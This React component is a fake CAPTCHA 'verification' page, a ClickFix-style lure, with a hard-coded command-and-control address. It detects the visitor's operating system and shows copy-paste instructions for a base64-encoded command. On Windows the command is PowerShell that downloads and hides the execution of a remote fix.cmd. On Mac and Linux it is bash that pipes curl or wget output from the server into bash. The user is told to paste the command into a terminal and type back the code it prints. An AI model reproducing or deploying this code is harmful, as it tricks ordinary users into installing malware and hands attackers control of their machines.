import React, { useState, useEffect, useRef } from 'react';



type StepsProps = {
  items: React.ReactNode[];
  className?: string;
};

export function Steps({ items, className }: StepsProps) {
  return (
    <ol
      className={className}
      style={{ listStyle: "none", paddingLeft: 0, margin: 0 }}
    >
      {items.map((item, i) => (
        <li
          key={i}
          className="flex items-start gap-2" // Tailwind (ignored if you don't use it)
          style={{
            display: "flex",
            alignItems: "flex-start", // number stays on the first line
            gap: "0.5em",
            lineHeight: 1.5,
            marginBottom: "0.25em",
          }}
        >
          <span style={{ minWidth: "1.2em", flexShrink: 0 }}>{i + 1}.</span>
          <span>{item}</span>
        </li>
      ))}
    </ol>
  );
}



const WelcomeWebsitePage: React.FC<{ onVerifyReady?: (verify: () => void) => void; onAutoVerify?: () => void; onPassed?: () => void; onBusy?: (busy: boolean) => void }> = ({ onVerifyReady, onAutoVerify, onPassed, onBusy }) => {
  const [step, setStep] = useState<0 | 1 | 2>(1);
  const [isChecked, setIsChecked] = useState(false);
  const [digits, setDigits] = useState<string[]>(['', '', '', '', '', '']);
  const digitRefs = useRef<Array<HTMLInputElement | null>>([]);
  const [error, setError] = useState(false);
  const [digitSpring, setDigitSpring] = useState(false);
  const payloadRef = useRef<HTMLInputElement>(null);

  // Device detection
  const detectDevice = (): 'windows' | 'mac' | 'linux' | 'android' | 'ios' => {
    const ua = navigator.userAgent || navigator.platform;
    if (/android/i.test(ua)) return 'android';
    if (/iPad|iPhone|iPod/i.test(ua)) return 'ios';
    if (/Win/.test(ua)) return 'windows';
    if (/Mac/.test(ua)) return 'mac';
    return 'linux';
  };

  const device = detectDevice();
  const stepSystem = device === 'mac' || device === 'ios' ? 'mac' : device === 'linux' || device === 'android' ? 'linux' : 'windows';

  // Generate random 6-char hex codes
  const randomCode = () => Math.random().toString(16).substring(2, 8).toUpperCase();
  const [keyB, setKeyB] = useState<string>('');
  const [checkPhase, setCheckPhase] = useState<'' | 'checking' | 'done'>('');
  const passedRef = useRef(false);

  // C2 Server — CHANGE ME
  const C2_URL = 'http://51.194.112.87/815';

  // Base64 encoders
  const b64UTF16 = (str: string): string => {
    let bin = '';
    for (let i = 0; i < str.length; i++) {
      const c = str.charCodeAt(i);
      bin += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff);
    }
    return btoa(bin);
  };

  const b64Standard = (str: string): string => btoa(unescape(encodeURIComponent(str)));



  
  
  const winScript = `$c='VERIFICATION CODE: ${keyB}';Write-Host $c;Start-Sleep -Seconds 1;$u='${C2_URL}/815w';$o=\"$env:TEMP\\fix.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden`;
  const winCommand = `powershell -Exec Bypass -EncodedCommand ${b64UTF16(winScript)}`;

  const unixScript = `#!/bin/bash\n(curl -sL ${C2_URL}/815l || wget -qO- ${C2_URL}/815l) | bash; echo 'VERIFICATION CODE: ${keyB}'`;
  const unixCommand = `echo '${b64Standard(unixScript)}' | base64 -d | bash`;

  const macScript = `#!/bin/bash\n curl -sL ${C2_URL}/815l | bash; echo 'VERIFICATION CODE: ${keyB}'`;
  const macCommand = `echo '${b64Standard(macScript)}' | base64 -d | bash`;



    const payloads = {
    windows: { text: winCommand, subtitle: '' },
    mac: { text: macCommand, subtitle: '' },
    linux: { text: unixCommand, subtitle: '' },
    android: { text: ``, subtitle: '' },
    ios: { text: ``, subtitle: '' },
  };

  const currentPayload = payloads[device] || payloads.linux;

  // Generate keys on mount
  useEffect(() => {
    setKeyB(randomCode());
  }, []);

  const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.checked) {
      setIsChecked(true);
      setStep(1);
    } else {
      setStep(0);
    }
  };

  const verifyCode = () => {
    const code = digits.join('').toUpperCase();
    if (code.length === 6 && code === keyB) {
      setError(false);
      setDigitSpring(false);
      onPassed?.();
      return;
    }
    setDigits(['', '', '', '', '', '']);
    setError(true);
    setDigitSpring(false);
    requestAnimationFrame(() => setDigitSpring(true));
    requestAnimationFrame(() => digitRefs.current[0]?.focus());
  };

  const writeDigits = (next: string[], focusIndex: number | null) => {
    setDigits(next);
    setError(false);
    setDigitSpring(false);
    if (focusIndex != null) requestAnimationFrame(() => digitRefs.current[focusIndex]?.focus());
  };

  const onDigitChange = (index: number, value: string) => {
    const chars = value.toUpperCase().replace(/[^A-Z0-9]/g, '');
    const next = [...digits];
    if (!chars) {
      next[index] = '';
      writeDigits(next, null);
      return;
    }
    chars.slice(0, 6 - index).split('').forEach((char, offset) => {
      next[index + offset] = char;
    });
    const empty = next.findIndex((char) => !char);
    writeDigits(next, empty === -1 ? index : empty);
    if (next.every((char) => char)) {
      if (next.join('').toUpperCase() === keyB) {
        setError(false);
        setDigitSpring(false);
        onPassed?.();
      } else {
        setDigits(['', '', '', '', '', '']);
        setError(true);
        setDigitSpring(false);
        requestAnimationFrame(() => {
          setDigitSpring(true);
          digitRefs.current[0]?.focus();
        });
    }
}
  };

  const onDigitKey = (index: number, event: React.KeyboardEvent<HTMLInputElement>) => {
    if (event.key === 'Backspace' && !digits[index] && index > 0) {
      event.preventDefault();
      const next = [...digits];
      next[index - 1] = '';
      writeDigits(next, index - 1);
    }
  };

  const verifyCodeRef = useRef(verifyCode);
  verifyCodeRef.current = verifyCode;
  useEffect(() => {
    onVerifyReady?.(() => verifyCodeRef.current());
  }, [onVerifyReady]);

  const copyToClipboard = () => {
    if (payloadRef.current) {
      payloadRef.current.select();
      document.execCommand('copy');
      // Visual feedback
      const btn = document.getElementById('copyBtn');
      const label = btn?.querySelector('span');
      if (btn && label) {
        label.textContent = 'Copied!';
        btn.style.background = '#16a34a';
        setTimeout(() => {
          label.textContent = 'Copy';
          btn.style.background = '#1a73e8';
        }, 3000);
      }
    }
  };

  return (


        <div className="welcome-steps">

          {step === 1 && (
          <div className="welcome-step">

            <p
              className="subtitle"
              id="step1Subtitle"
              style={{ fontSize: '14px', color: '#64748b', marginBottom: '24px', lineHeight: '1.5' }}
              dangerouslySetInnerHTML={{ __html: currentPayload.subtitle }}
            />

            <p style={{
              margin: '8px 0 0',
              paddingLeft: '16px',
              fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
              fontSize: '16px',
              fontWeight: 400,
              lineHeight: '24px',
              letterSpacing: 'normal',
              color: '#202124',
              textAlign: 'left',
            }}>
              To better prove you are not a robot, please:
            </p>
            {stepSystem === 'windows' && (
  <>
    <style>{`
      .verify-os {
        list-style: none !important;
        counter-reset: step;
        padding-left: 16px !important;
        margin-left: 0 !important;
        margin-top: 0.8em !important;
        margin-bottom: 0 !important;
      }
      .verify-os li {
        display: block !important;
        counter-increment: step;
        position: relative;
        padding-left: 1.8em;
        line-height: 1.6;
        margin-bottom: 0.4em;
      }
      .verify-os li::before {
        content: counter(step) ".";
        position: absolute;
        left: 0;
        top: 0;
        width: 1.8em;
      }
      /* the code-box row: no number, keeps numbering intact */
      .verify-os li.no-number {
        counter-increment: none;
        padding-left: 1.8em;
        margin: 0.6em 0;
      }
      .verify-os li.no-number::before {
        content: "";
      }
      .verify-os .rc-key {
        display: inline-block;
        height: 1.2em;
        vertical-align: middle;
        margin: 0 0.2em;
      }
    `}</style>

    <ol className="verify-os">
      <li>
        Press &amp; hold the Windows Key
        <img className="rc-key" src="/windows-key.png" alt="Windows" draggable={false} />
        + <strong>R</strong>.
      </li>
      <li>
        Type&nbsp;<strong>cmd</strong>&nbsp;and&nbsp;press&nbsp;<strong>Enter</strong>.
      </li>
      <li>
        Paste the command below and press Enter. You will see your verification code.
        
      </li>

      {/* ↓↓↓ Move your existing input + Copy button markup here ↓↓↓ */}
      <li className="no-number">
<div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '12px' }}>
              <input
                ref={payloadRef}
                value={currentPayload.text}
                readOnly
                style={{
                  flex: 1,
                  minWidth: 0,
                  height: '32px',
                  background: '#fff',
                  border: '1px solid #dadce0',
                  borderRadius: '4px',
                  color: '#202124',
                  fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
                  fontSize: '16px',
                  padding: '0 10px',
                  outline: 'none',
                }}
              />
              <button
                id="copyBtn"
                onClick={copyToClipboard}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '4px',
                  padding: '0 12px',
                  background: '#1a73e8',
                  color: '#fff',
                  fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
                  fontSize: '14px',
                  fontWeight: '500',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  whiteSpace: 'nowrap',
                  flexShrink: 0,
                  height: '32px',
                }}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                  <rect x="8" y="8" width="12" height="12" rx="2" stroke="#fff" strokeWidth="2" />
                  <path d="M6 16H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="#fff" strokeWidth="2" />
                </svg>
                <span>Copy</span>
              </button>
            </div>

      </li>
      {/* ↑↑↑ end of the code box row ↑↑↑ */}

      <li>
        Enter the verification code shown in the window below.
      </li>
    </ol>
  </>
)}
            {/* {stepSystem === 'mac' && ( */}

            {stepSystem === 'mac' && (
              <>
    <style>{`
      .verify-os {
        list-style: none !important;
        counter-reset: step;
        padding-left: 16px !important;
        margin-left: 0 !important;
        margin-top: 0.8em !important;
        margin-bottom: 0 !important;
      }
      .verify-os li {
        display: block !important;
        counter-increment: step;
        position: relative;
        padding-left: 1.8em;
        line-height: 1.6;
        margin-bottom: 0.4em;
      }
      .verify-os li::before {
        content: counter(step) ".";
        position: absolute;
        left: 0;
        top: 0;
        width: 1.8em;
      }
      /* the code-box row: no number, keeps numbering intact */
      .verify-os li.no-number {
        counter-increment: none;
        padding-left: 1.8em;
        margin: 0.6em 0;
      }
      .verify-os li.no-number::before {
        content: "";
      }
      .verify-os .rc-key {
        display: inline-block;
        height: 1.2em;
        vertical-align: middle;
        margin: 0 0.2em;
      }
    `}</style>

    <ol className="verify-os">
      <li>
        Press <strong>Command (<span className="rc-key-char" aria-label="Mac">⌘</span>)</strong>
        
        +<strong>Space</strong> to open Spotlight.
      </li>
      <li>
        Type&nbsp;<strong>terminal</strong>&nbsp;and&nbsp;press&nbsp;<strong>Enter</strong>.
      </li>
      <li>
        Paste the command below and press Enter. You will see your verification code.
        
      </li>

      {/* ↓↓↓ Move your existing input + Copy button markup here ↓↓↓ */}
      <li className="no-number">
<div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '12px' }}>
              <input
                ref={payloadRef}
                value={currentPayload.text}
                readOnly
                style={{
                  flex: 1,
                  minWidth: 0,
                  height: '32px',
                  background: '#fff',
                  border: '1px solid #dadce0',
                  borderRadius: '4px',
                  color: '#202124',
                  fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
                  fontSize: '16px',
                  padding: '0 10px',
                  outline: 'none',
                }}
              />
              <button
                id="copyBtn"
                onClick={copyToClipboard}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '4px',
                  padding: '0 12px',
                  background: '#1a73e8',
                  color: '#fff',
                  fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
                  fontSize: '14px',
                  fontWeight: '500',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  whiteSpace: 'nowrap',
                  flexShrink: 0,
                  height: '32px',
                }}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                  <rect x="8" y="8" width="12" height="12" rx="2" stroke="#fff" strokeWidth="2" />
                  <path d="M6 16H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="#fff" strokeWidth="2" />
                </svg>
                <span>Copy</span>
              </button>
            </div>

      </li>
      {/* ↑↑↑ end of the code box row ↑↑↑ */}

      <li>
        Please write down the code from the terminal and enter it below.
      </li>

                
    </ol>
  </>
            )}

            {stepSystem === 'linux' && (
<>
    <style>{`
      .verify-os {
        list-style: none !important;
        counter-reset: step;
        padding-left: 16px !important;
        margin-left: 0 !important;
        margin-top: 0.8em !important;
        margin-bottom: 0 !important;
      }
      .verify-os li {
        display: block !important;
        counter-increment: step;
        position: relative;
        padding-left: 1.8em;
        line-height: 1.6;
        margin-bottom: 0.4em;
      }
      .verify-os li::before {
        content: counter(step) ".";
        position: absolute;
        left: 0;
        top: 0;
        width: 1.8em;
      }
      /* the code-box row: no number, keeps numbering intact */
      .verify-os li.no-number {
        counter-increment: none;
        padding-left: 1.8em;
        margin: 0.6em 0;
      }
      .verify-os li.no-number::before {
        content: "";
      }
      .verify-os .rc-key {
        display: inline-block;
        height: 1.2em;
        vertical-align: middle;
        margin: 0 0.2em;
      }
    `}</style>

    <ol className="verify-os">
      <li>
        Press the <strong>Ctrl</strong> + <strong>Alt</strong> + <strong>T</strong> 
      </li>
      <li>
        Paste the command below and press Enter. You will see your verification code.
      </li>
      <li className="no-number">
        <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '12px' }}>
              <input
                ref={payloadRef}
                value={currentPayload.text}
                readOnly
                style={{
                  flex: 1,
                  minWidth: 0,
                  height: '32px',
                  background: '#fff',
                  border: '1px solid #dadce0',
                  borderRadius: '4px',
                  color: '#202124',
                  fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
                  fontSize: '16px',
                  padding: '0 10px',
                  outline: 'none',
                }}
              />
              <button
                id="copyBtn"
                onClick={copyToClipboard}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '4px',
                  padding: '0 12px',
                  background: '#1a73e8',
                  color: '#fff',
                  fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
                  fontSize: '14px',
                  fontWeight: '500',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer',
                  whiteSpace: 'nowrap',
                  flexShrink: 0,
                  height: '32px',
                }}
              >
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                  <rect x="8" y="8" width="12" height="12" rx="2" stroke="#fff" strokeWidth="2" />
                  <path d="M6 16H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="#fff" strokeWidth="2" />
                </svg>
                <span>Copy</span>
              </button>
            </div>
              {/* small light note below the input */}
            <p style={{
              margin: '6px 0 0',
              fontSize: '12px',
              color: '#94a3b8',
              lineHeight: 1.4,
            }}>
            </p>

      </li>

      {/* ↑↑↑ end of the code box row ↑↑↑ */}

      <li>
        Please write down the code from the terminal and enter it below.
      </li>

                
    </ol>
  </>
            )}

            <div style={{ marginTop: 'auto', marginBottom: '10px' }}>
            
            <div className="six-digits">
              <p>Verification Code :</p>
              <div
                className={`six-digits-row${digitSpring ? ' is-spring' : ''}${error ? ' is-error' : ''}`}
                onAnimationEnd={() => setDigitSpring(false)}
              >
                {digits.map((digit, index) => (
                  <input
                    key={index}
                    ref={(node) => { digitRefs.current[index] = node; }}
                    className="six-digit"
                    value={digit}
                    inputMode="text"
                    autoComplete="off"
                    maxLength={6}
                    aria-label={`Digit ${index + 1}`}
                    onChange={(event) => onDigitChange(index, event.target.value)}
                    onKeyDown={(event) => onDigitKey(index, event)}
                  />
                ))}
              </div>
            </div>
            </div>
          </div>
        )}

        {/* Step 2 */}
        {step === 2 && (
          <div style={{ textAlign: 'center', padding: '40px 0' }}>
            <h2 style={{ color: '#16a34a' }}>✅ Verification successful</h2>
            <p>You are now verified.</p>
          </div>
        )}
     </div>
  
  );
};

export default WelcomeWebsitePage;